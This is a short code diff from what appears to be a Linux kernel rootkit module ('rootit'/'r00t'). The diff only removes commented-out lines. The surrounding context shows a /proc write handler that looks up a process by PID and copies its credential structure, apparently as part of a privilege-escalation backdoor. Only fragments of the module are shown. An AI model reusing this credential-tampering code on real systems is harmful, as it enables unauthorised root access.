@@ -23,7 +23,6 @@ static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry * rootit;
 static struct cred *cred_back;
 static struct task_struct *task;
-//static int loaded;
 static ssize_t imagemlt_rootit_write(struct file *file, const char __user *buffer,
                                     size_t count, loff_t *data)
 {
@@ -55,7 +54,6 @@ static ssize_t imagemlt_rootit_write(struct file *file, const char __user *buffe
         p=list_entry(pos,struct task_struct,tasks);
     	//if(!strncmp(p->comm,(char*)buf,strlen(p->comm))){
     	if(p->pid==res){
-		//loaded=1;
         	task = p;
         	cred = (struct cred *)__task_cred(task);
         	memcpy(cred_back, cred, sizeof(struct cred));
@@ -109,7 +107,6 @@ static int imagemlt_root_procfs_attach(void)
 static int __init imagemlt_r00t_init(void)
 {
     int ret;
-    //loaded=0;
     cred_back = kmalloc(sizeof(struct cred), GFP_KERNEL);
     if (IS_ERR(cred_back))
         return PTR_ERR(cred_back);
